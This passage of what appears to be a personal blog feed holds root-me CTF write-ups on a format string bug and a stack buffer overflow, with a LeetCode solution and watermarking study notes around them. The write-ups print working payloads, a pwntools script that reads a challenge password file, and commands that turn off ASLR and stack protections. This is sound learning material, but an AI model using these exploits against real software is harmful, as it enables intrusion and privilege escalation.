<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">strings <span class="number">-13</span> &lt; &lt;(<span class="keyword">for</span> i in `seq <span class="number">1</span> <span class="number">20</span>`; \</span><br><span class="line">    do ~/ch5 &quot;%$i&quot;&#x27;$08X&#x27;&quot;%$((i+1))&quot;&#x27;$08X&#x27;&quot;%$((i+2))&quot;&#x27;$08X&#x27;&quot;%$((i+3))&quot;&#x27;$08X&#x27; \</span><br><span class="line">    |sed -r &#x27;s/(..)(..)(..)(..)/\4\3\2\1/g&#x27; \</span><br><span class="line">    |xxd -r -p; echo;  done)</span><br></pre></td></tr></table></figure>

<p>注：：</p>
<pre><code>┌─[zentreisender@parrotos]─[~/Documents]
└──╼ $strings -h
Usage: strings [option(s)] [file(s)]
 Display printable strings in [file(s)] (stdin by default)</code></pre>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>Format string bug basic 2</title>
    <url>/2020/11/29/Format_string_bug_basic_2/</url>
    <content><![CDATA[<h2 id="ELF-x86-Format-string-bug-basic-2"><a href="#ELF-x86-Format-string-bug-basic-2" class="headerlink" title="ELF x86 - Format string bug basic 2"></a>ELF x86 - Format string bug basic 2</h2><hr>
<h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><p><code>snprintf</code>— prints into a <code>string</code> with length checking<br>(<a href="https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html">https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html</a>)<br>snprintf（）函数应与sprintf（）等效，并增加了n参数，该参数指出s所指缓冲区的大小。<br>·如果n为零，则不写任何内容，而s可以为空指针。<br>·否则，将丢弃第n-1st之后的输出字节，而不是将其写入数组，并且在实际写入数组的字节的末尾写入一个空字节。<br><em>也就是增加了限制</em></p>
<a id="more"></a>
<hr>
<h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p><code>format</code>是一个字符串，以其初始移位状态（如果有）开始和结束。<br>format由零个或多个<code>指令</code>组成：<code>普通字符</code>（简单地<code>复制到输出流</code>中）和<code>转换规范</code>，每个转换规范都将导致获取零个或多个<code>参数</code>。<br>·如果format的参数不足，则结果不确定</p>
<hr>
<h3 id="％n"><a href="#％n" class="headerlink" title="％n $"></a>％n $</h3><p>·可以将<code>转换</code>应用于参数列表中格式之后的第n个参数，而不是下一个未使用的参数。<br>·在这种情况下，转换说明符字符％（请参见下文）由序列“％n $”代替，其中n是[1，{NL_ARGMAX}]范围内的十进制整数，给出了参数在参数中的位置。</p>
<hr>
<p>For example, <code>printf(&quot;%2$x&quot;, 1, 2, 3)</code> will print<code> 2</code>. In general, we can do <code>printf(&quot;%&lt;some number&gt;$x&quot;)</code> to select an arbitrary argument to printf.</p>
<hr>
<h3 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h3><p>n  参数应该是一个指向整数的指针，到目前为止，通过对fprintf（）函数之一的调用，将写入输出的<code>字节数</code></p>
<hr>
<p>The <code>number of characters written so far</code> is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</p>
<hr>
<h3 id="源代码"><a href="#源代码" class="headerlink" title="源代码"></a>源代码</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv )</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">int</span> var;</span><br><span class="line">        <span class="keyword">int</span> check  = <span class="number">0x04030201</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">char</span> fmt[<span class="number">128</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (argc &lt;<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>( fmt, <span class="number">0</span>, <span class="keyword">sizeof</span>(fmt) );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check at 0x%x\n&quot;</span>, &amp;check );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;argv[1] = [%s]\n&quot;</span>, argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">snprintf</span>( fmt, <span class="keyword">sizeof</span>(fmt), argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))    </span><br><span class="line">                <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way !\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;fmt=[%s]\n&quot;</span>, fmt );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check=0x%x\n&quot;</span>, check );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (check==<span class="number">0xdeadbeef</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude ! You win !\n&quot;</span>);</span><br><span class="line">                setreuid(geteuid(), geteuid());</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">Download</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><pre><code>app-systeme-ch14@challenge02:~$ (for i in `seq 1 10`; do ./ch14 &quot;%$i&quot;&#39;$08x&#39;; ech
o;done)
check at 0xbffffae8
argv[1] = [%1$08x]
fmt=[080485f1]
check=0x4030201

check at 0xbffffae8
argv[1] = [%2$08x]
fmt=[00000000]
check=0x4030201

check at 0xbffffae8
argv[1] = [%3$08x]
fmt=[00000000]
check=0x4030201

check at 0xbffffae8
argv[1] = [%4$08x]
fmt=[000000c2]
check=0x4030201

check at 0xbffffae8
argv[1] = [%5$08x]
fmt=[bffffc34]
check=0x4030201

check at 0xbffffae8
argv[1] = [%6$08x]
fmt=[b7fe1439]
check=0x4030201

check at 0xbffffae8
argv[1] = [%7$08x]
fmt=[f63d4e2e]
check=0x4030201

check at 0xbffffae8
argv[1] = [%8$08x]
fmt=[04030201]
check=0x4030201

check at 0xbffffae8
argv[1] = [%9$08x]
fmt=[00000000]
check=0x4030201

check at 0xbffffae8
argv[1] = [%10$08x]
fmt=[00000000]
check=0x4030201</code></pre>
<p>第<code>8</code>处存着<code>check</code></p>
<hr>
<pre><code>(for i in `seq 1 12`; do ./format_2 &quot;AAAA%$i&quot;&#39;$08x&#39;;echo;done)


check at 0xbffffae8
argv[1] = [AAAA%8$08x]
fmt=[AAAA04030201]
check=0x4030201

check at 0xbffffae8
argv[1] = [AAAA%9$08x]
fmt=[AAAA41414141]
check=0x4030201

check at 0xbffffae8
argv[1] = [ABCD%8$08x]
fmt=[ABCD04030201]
check=0x4030201

check at 0xbffffae8
argv[1] = [ABCD%9$08x]
fmt=[ABCD44434241]
check=0x4030201</code></pre>
<p>输入值在第九处(小端序)<br>check 在第八处</p>
<hr>
<h3 id="hn"><a href="#hn" class="headerlink" title="%hn"></a>%hn</h3><p>use <code>%hn</code> to write only 2 bytes at a time.</p>
<pre><code>%n          一次性写入 4 个字节

%hn         一次性写入 2 个字节

%hhn        一次性写入 1 个字节</code></pre>
<p>./a.out “$(python -c ‘import sys; sys.stdout.write(“CAAAAAAA<code>%2044x%10$hn</code>%38912x%11$hn”)’)”<br><a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></p>
<p><del>printf (“\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|”);</del></p>
<p><del>./format_2 $(python2 -c ‘print “\xd8\xfa\xff\xbf%9$08s”‘)</del></p>
<hr>
<h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$x
&quot;&#39;)&quot;
check at 0xbffffae8
argv[1] = [Øúÿ¿%9$x]
fmt=[Øúÿ¿bffffad8]
check=0x4030201

app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$s
&quot;&#39;)&quot;
check at 0xbffffae8
argv[1] = [Øúÿ¿%9$s]
fmt=[Øúÿ¿Â]
check=0x4030201</code></pre>
<hr>
<p>\xdead=57005<br>\xbeef=48879<br>\xdead-\xbeef=8126<br>第九处写\xbeef 48879-8<br>第十处写\xdead 8126(已经输出了48879)</p>
<pre><code>app-systeme-ch14@challenge02:~$ ./ch14 $(python -c &#39;print &quot;\xc8\xfa\xff\xbf\xca\
xfa\xff\xbf%48871x%9$hn&quot;+&quot;%8126x%10$hn&quot;&#39;)
check at 0xbffffac8
argv[1] = [Èúÿ¿Êúÿ¿%48871x%9$hn%8126x%10$hn]
fmt=[Èúÿ¿Êúÿ¿
                                                    ]
check=0xdeadbeef
Yeah dude ! You win !
app-systeme-ch14-cracked@challenge02:~$ cat .passwd</code></pre>
]]></content>
      <categories>
        <category>APP system in root_me</category>
      </categories>
      <tags>
        <tag>PWN</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode longest_substring_without_repeating_characters</title>
    <url>/2020/12/11/LEETCODE-longest_substring_without_repeating_characters/</url>
    <content><![CDATA[<h2 id="longest-substring-without-repeating-characters"><a href="#longest-substring-without-repeating-characters" class="headerlink" title="longest_substring_without_repeating_characters"></a>longest_substring_without_repeating_characters</h2><p>这题用到了哈希表 和 滑动窗口</p>
<p>滑动窗口：<br>就是有两个变量分别指示 窗口的 头和尾，就可以任意改变这两个变量</p>
<p>哈希表：<br>哈希表存着目前最长子组的值-地址对</p>
<a id="more"></a>

<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unordered_map&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="comment">/* data */</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">   <span class="function"><span class="keyword">int</span> <span class="title">lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span>;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">Solution::lengthOfLongestSubstring</span><span class="params">(<span class="built_in">string</span> s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int32_t</span> begin=<span class="number">0</span>,end=<span class="number">0</span>,begin_new=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">unordered_map</span>&lt;<span class="keyword">char</span>,<span class="keyword">int</span>&gt; windows;</span><br><span class="line">    <span class="keyword">int</span> count=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; s.size(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//windows.insert(make_pair(s[i],i));</span></span><br><span class="line">        <span class="keyword">if</span>(windows.count(s[end])==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//有重复值，那么获得目前的最大值</span></span><br><span class="line">            <span class="keyword">if</span> (end-begin&gt;count || count==<span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                count=end-begin;</span><br><span class="line">            &#125;</span><br><span class="line">            begin_new=windows[s[end]]+<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//delete </span></span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">size_t</span> i = begin; i &lt; begin_new; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                windows.erase(s[i]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//插入新的重复值</span></span><br><span class="line">            windows.insert(<span class="built_in">make_pair</span>(s[end],end));</span><br><span class="line">            end++;</span><br><span class="line">            begin=begin_new;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end-begin&gt;count)</span><br><span class="line">    &#123;</span><br><span class="line">        count=end-begin;</span><br><span class="line">    &#125;    </span><br><span class="line">    <span class="keyword">return</span> count;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><a href="https://imgchr.com/i/rAyOUO"><img src="https://s3.ax1x.com/2020/12/11/rAyOUO.jpg" alt="rAyOUO.jpg"></a></p>
]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记1</title>
    <url>/2020/01/21/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B01/</url>
    <content><![CDATA[<ol>
<li>the  water-mark robustness is the key performance parameter.</li>
<li>a  watermark  can  be  embedded  in  every  frame.  </li>
<li>watermarking that pro-tects the content even after decryption<a id="more"></a></li>
<li>due  to  higher  data  embedding  capacity of image,</li>
<li>visible watermark is a secondary translu-cent  overlaid  into  the  primary  image. </li>
<li>Dual watermark is a combination of a visible and an invisible watermark </li>
<li>the  watermarking  system  consists  of  two  processes  -  encoding  and  extraction  process<br><img src="https://s2.ax1x.com/2020/01/21/1kQhQA.png"></li>
</ol>
<p>lossy compression 有损压缩<br>steganography  隐写术<br>obustness 健壮性<br>exponentially 指数地<br>archiving 存档<br>geometrical 几何<br>Classification 分类<br>Spatial 空间的<br>cryptography 密码学<br>pixel 像素点 [ˈpɪksl]<br>designated  特定的<br>confidentiality 保密<br>on  account of 由于<br>Tamper 篡改<br>confidentiality 机密性</p>
]]></content>
      <tags>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记2</title>
    <url>/2020/01/23/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B02/</url>
    <content><![CDATA[<p>state-of-the-art 最先进的<br>Error Correcting Codes  ECC<br>discrete wavelet transform (DWT) 离散小波变换<br>The  ECC  based  watermarking  methods  attempt  to  find  a  trade-off  between the number of bits to be embedded and the number of bit-errors that can be corrected.  </p>
<p>the  technique  embeds  medical  text  watermarks  into  selected  sub-band  of  discrete wavelet transform (DWT) cover medical image coefficients using spread-spectrum technique.该技术使用扩展频谱技术将医学文本水印嵌入离散小波变换（DWT）覆盖医学图像系数的选定子带中。</p>
<p> **Any  image  com-prises of two sections called ROI and NROI **</p>
<a id="more"></a>
<p> ROI is an area that has sensi-tive data, so it cannot be allowed to be modified because most of the information is  present  in  this  area  [105].  NROI  is  an  area  of  image  that  does  not  have  an  important  data  i.e.  background  of  image.<br> The  spatial  domain  tech-niques such as LSB substitutions, correlation-based, spread-spectrum and Patchwork are straight forward and computationally simple.<br> In the transform domain techniques, the data is embedded by modulating the coefficients of a transform discrete wavelet transform  (DWT),  discrete  cosine  transform  (DCT),  singular  value  decomposition  (SVD) and discrete Fourier transform (DFT).<br>finite energy function 有限能量函数</p>
<p>在数位信号处理领域中，降采样，又作减采集,是一种多速率数字信号处理的技术或是降低信号采样率的过程，通常用于降低数据传输速率或者数据大小。<br>降采样因子（常用表示符号为＂M＂）一般是大于１的整数或有理数。<br>这个因子表达采样周期变成原来的M倍，或者等价表示采样率变成原来的1/M倍。 采样率的降低会造成频谱的压缩，因此需要利用滤波器确保在较低的采样频率下不发生混叠，确保奈奎式采样定理依旧成立。</p>
<p>形式幂级数上的一个重要映射是系数的提取操作：将一个形式幂级数映射到它的X^n的系数。这个操作常常记作[X^n]，</p>
<p>以一变数为t 的函数 f(t) 为例，f(t) 经过一积分转换T 得到Tf(u)：<br>其中 K 是个确定的二元函数, 称为此积分变换的核函数（kernel function）或核（nucleus）。当选取不同的积分域和变换核时，就得到不同名称的积分变换。f(t) 称为象原函数，Tf(u) 称为 f(t) 的象函数，在一定条件下，它们是一一对应而变换是可逆的。</p>
<p>定义在实数域上的实函数相对于值c的n阶矩为:</p>
<p>如果f(x)是概率密度函数，则容易看出相对于值0的1阶矩是连续随机变量的数学期望。</p>
<p>vanishing moment</p>
<p>母小波定义为<br><img src="https://s2.ax1x.com/2020/01/23/1EbUyt.png" alt="1EbUyt.png"><br>其中a是缩放因子，当|a|&lt;1时，母小波被压缩，在时间轴上有较小的支撑度，并且对应到高频，因为母小波变窄、变化变快， 反之，当|a|&gt;1时，母小波变宽、变化较慢，所以对应到低频。b则是平移参数，用来决定母小波的位置。<br>小波分析（英语：wavelet analysis）或小波变换（英语：wavelet transform）是指用有限长或快速衰减的“母小波”（mother wavelet）的振荡波形来表示信号。该波形被缩放和平移以匹配输入的信号。<br>在信号处理中，窗函数（英语：window function）是一种除在给定区间之外取值均为0的实函数。譬如：在给定区间内为常数而在区间外为0的窗函数被形象地称为矩形窗。任何函数与窗函数之积仍为窗函数，所以相乘的结果就像透过窗口“看”其他函数一样</p>
<p>变换(Transform)、量化(Quantization)和编码(Coding)[<br>另外，当输入信号为二维时（例如：影像），短时距傅里叶变换的输出为四维度，但小波变换仍是二维信号，所以在影像处理上通常会使用小波变换而非短时距傅里叶变<br>换。</p>
<p>ΣΣ 这是二重求和符号</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">i=m j=n</span><br><span class="line">..Σ... Σ . . . . ai bj = a1b1+a1b2+ . . . +a1bn+</span><br><span class="line">i=<span class="number">1</span> j=<span class="number">1</span> . . . . . . .+a2b1+a2b2+ . . . +a2bn+</span><br><span class="line">. . . . . .. . . . . . . . . . +. . . . +</span><br><span class="line">. . . . . . . . . . . . . . . .+amb1+amb2+ . . . . +ambn.</span><br></pre></td></tr></table></figure>




]]></content>
      <tags>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记3</title>
    <url>/2020/01/25/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B03/</url>
    <content><![CDATA[<p>There  are  a  wide  variety  of  popular  wavelet  algorithms,  including  Daubechies  wavelets,  Mexican  Hat  wavelets  and  Morlet  wavelets </p>
<p>HAAR</p>
<p>In addition, the Haar wavelet transform is fast, memory efficient and  exactly  reversible  without  the  edge  effects  that  are  present  in  other  wavelet  transforms.</p>
<p>the water-mark can be embedded into the other three sub-bands (HL, LH and HH sub-band) to  maintain  better  image  quality. </p>
<a id="more"></a>
]]></content>
      <tags>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>Medical Image WatermarkingTechniques and Applications&gt;&gt;笔记4</title>
    <url>/2020/01/28/Medical%20Image%20WatermarkingTechniques%20and%20Applications)%25)%25%E7%AC%94%E8%AE%B04/</url>
    <content><![CDATA[<p>orthonormal matrices  正交矩阵<br>a  message  can  be  hidden  in  cover document   if   the   content   of   the   document   hashigh redundancy.<br>propose  a  new  reliable  method  by hiding  the  encrypted  watermark  in  the  RONI  part  of  the medical   image   using   DWT   approach.<br>ROI Based Medical Image Watermarking with Zero Distortion and Enhanced Security 所读论文</p>
<p>直方图均衡化（Histogram Equalization）</p>
<a id="more"></a>
]]></content>
      <tags>
        <tag>watermark</tag>
      </tags>
  </entry>
  <entry>
    <title>PWN keep going</title>
    <url>/2020/11/10/PWN_keep_going/</url>
    <content><![CDATA[<h2 id="Sploitfun-Classic-Stack-Based-Buffer-Overflow"><a href="#Sploitfun-Classic-Stack-Based-Buffer-Overflow" class="headerlink" title="Sploitfun-Classic Stack Based Buffer Overflow"></a>Sploitfun-Classic Stack Based Buffer Overflow</h2><p><code>sudo bash -c &quot;echo 0 &gt; /proc/sys/kernel/randomize_va_space&quot;</code><br>关闭ASLR<br>具体可见<a href="https://blog.csdn.net/Plus_RE/article/details/79199772">https://blog.csdn.net/Plus_RE/article/details/79199772</a></p>
<p><code>gcc  -pie      </code>Create a dynamically linked position independent executable.<br>Linux 平台通过 PIE 机制来负责代码段和数据段的随机化工作</p>
<pre><code>gcc -g -fno-stack-protector -z execstack -o vuln vuln.c</code></pre>
<a id="more"></a>
<p>加上<code>-g</code>选项以后，gcc在编译是会做以下额外的操作：</p>
<ol>
<li>创建符号表，符号表包含了程序中使用的变量名称的列表。</li>
<li>关闭所有的优化机制，以便程序执行过程中严格按照原来的C代码进行。</li>
</ol>
<p><code>-z execstack </code>禁用NX保护</p>
<p>详细的保护机制讲解<br><a href="https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/">https://introspelliam.github.io/2017/09/30/pwn/linux%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%B8%B8%E7%94%A8%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/</a></p>
<p><code>gdb -q</code><br>  -q, –quiet, –silent<br>                     Do not print version number on startup.</p>
<pre><code>gdb-peda$ r `python -c &#39;print &quot;A&quot;*300&#39;`

gdb-peda$ help p</code></pre>
<p>Print value of expression EXP.</p>
<pre><code>gdb-peda$ p/x $rip</code></pre>
<p><strong>这个教程太老了，还是32位上的</strong></p>
<hr>
<p>*经典root-me *</p>
<h2 id="ELF-x86-Stack-buffer-overflow-basic-1"><a href="#ELF-x86-Stack-buffer-overflow-basic-1" class="headerlink" title="ELF x86 - Stack buffer overflow basic 1"></a>ELF x86 - Stack buffer overflow basic 1</h2><h3 id="64-Bits-Linux-Stack-Based-Buffer-Overflow"><a href="#64-Bits-Linux-Stack-Based-Buffer-Overflow" class="headerlink" title="64 Bits Linux Stack Based Buffer Overflow"></a>64 Bits Linux Stack Based Buffer Overflow</h3><h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p> So memory addresses are <code>64 bits</code> long, but <code>user space </code>only uses<br>the <code>first 47 bits</code>; keep this in mind because if you specified an<br>address greater than<code> 0x00007fffffffffff</code>, you’ll raise an <code>exception</code>. So<br>that means that 0x4141414141414141 will raise exception, but the<br>address <code>0x0000414141414141</code> is safe. </p>
<pre><code>64位下，用户空间只用低47位，所以不要超过0x00007fffffffffff</code></pre>
<hr>
<pre><code>$./vuln $(python -c &#39;print &quot;A&quot;*300&#39;)

gdb-peda$ x/20xg $rsp</code></pre>
<p><del>栈从高地址往低地址方向 扩展<br>溢出的时候，字符往高地址扩展</del></p>
<hr>
<h4 id="leave和ret"><a href="#leave和ret" class="headerlink" title="leave和ret"></a>leave和ret</h4><pre><code>leave = mov esp,ebp ; pop ebp
ret = pop EIP</code></pre>
<p>leave 执行后<br><code>指向返回地址</code><br>再<code> pop 将返回地址赋给 EIP</code></p>
<h4 id="不能控制RIP"><a href="#不能控制RIP" class="headerlink" title="不能控制RIP"></a>不能控制RIP</h4><p>So the program ends and we’re not able to control RIP:( Why?Because we  <code> override   too   much   bits</code>,   remember   biggest   address   is 0x00007fffffffffff and we try to overflow using 0x4141414141414141</p>
<p>de08-dd00=0x108  ==264</p>
<h4 id="小端序"><a href="#小端序" class="headerlink" title="小端序"></a>小端序</h4><pre><code>gdb-peda$ r $(python -c &#39;print &quot;A&quot;*264+&quot;B&quot;*6&#39;)</code></pre>
<p><del>ASLR 开起来了</del></p>
<p>输入是”A”*264+”ABCDEF”</p>
<pre><code>0x7fffffffde28:    0x41    0x42    0x43    0x44    0x45    0x46    0x00    0x00</code></pre>
<p>是<code>按序</code>填充的</p>
<p><strong>但有因为小端序，所以又倒序读入RIP</strong><br><code>RIP: 0x464544434241 (&#39;ABCDEF&#39;)</code></p>
<hr>
<h4 id="跳转到用户控制的地址"><a href="#跳转到用户控制的地址" class="headerlink" title="跳转到用户控制的地址"></a>跳转到用户控制的地址</h4><p><em>（显然没有开NX）</em></p>
<pre><code>&quot;A&quot; * 264 + &quot;\x7f\xff\xff\xff\xdc\x90&quot;[::-1]</code></pre>
<p><code>0x7fffffffdc90</code>buf在栈中开始地址</p>
<p>We  need  to  reverse the  memory  address  because  it’s  a <code> little  endian architecture</code>. That’sexactly what<code>[::-1]</code>does in python.<br>[::-1]逆序</p>
<hr>
<p>本题考察了Unix基本输入输出流与缓冲</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">int</span> var;</span><br><span class="line">  <span class="keyword">int</span> check = <span class="number">0x04030201</span>;</span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">40</span>];</span><br><span class="line"> </span><br><span class="line">  fgets(buf,<span class="number">45</span>,<span class="built_in">stdin</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n[buf]: %s\n&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[check] %p\n&quot;</span>, check);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))</span><br><span class="line">    <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way!\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">if</span> (check == <span class="number">0xdeadbeef</span>)</span><br><span class="line">   &#123;</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude! You win!\nOpening your shell...\n&quot;</span>);</span><br><span class="line">     setreuid(geteuid(), geteuid());</span><br><span class="line">     system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">     <span class="built_in">printf</span>(<span class="string">&quot;Shell closed! Bye.\n&quot;</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>标准输入后，还会跟上’\r\n’<br>fgets()读取45-1个字节，或者遇到’\n’停止<br>所以只是溢出4个字节即可，覆盖掉<code>check</code><br><code>0xdeadbeef</code>还需要逆序</p>
<p><del>但我不知道unix的输入输出流</del><br>payload:(python -c ‘print “a”*40+”DEADBEEF”.decode(“hex”)[::-1]’;cat) | ./ch13<br>得到shell后：<code>cat .passwd</code></p>
<hr>
<p>别人使用脚本编写的</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta"># solution by MtucX</span></span><br><span class="line"># Require pwntools</span><br><span class="line">from pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line">pwn_socket=ssh(host=&#x27;challenge02.root-me.org&#x27; ,user=&#x27;app-systeme-ch13&#x27; ,password=&#x27;app-systeme-ch13&#x27;,port=2222)</span><br><span class="line">pwned=pwn_socket.process(executable=&#x27;./ch13&#x27;)</span><br><span class="line">pwned.sendline(&#x27;A&#x27; * 40  + &#x27;\xef\xbe\xad\xde&#x27;)</span><br><span class="line">pwned.sendline(&#x27;cat .passwd&#x27;)</span><br><span class="line">pwned.interactive()</span><br></pre></td></tr></table></figure>
<hr>
<p>关于unix系统输入输出流<br><a href="http://repository.root-me.org/Administration/Unix/Linux/EN%20-%20buffering%20in%20standard%20streams.pdf" title="stdio buffer">stdio buffer</a><br>参考：<a href="http://showlinkroom.me/2017/11/20/Root-me-App-System01/">http://showlinkroom.me/2017/11/20/Root-me-App-System01/</a></p>
<pre><code>python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; + &quot;\x00&quot;*4052 + &quot;cat .passwd&quot;&#39; | ./ch13</code></pre>
<p>将stdin buffer填满，让数据不填入buffer中，留在外面。</p>
<pre><code>(python -c &#39;print &quot;a&quot;*40+&quot;\xef\xbe\xad\xde&quot; &#39;; cat ) | ./ch13</code></pre>
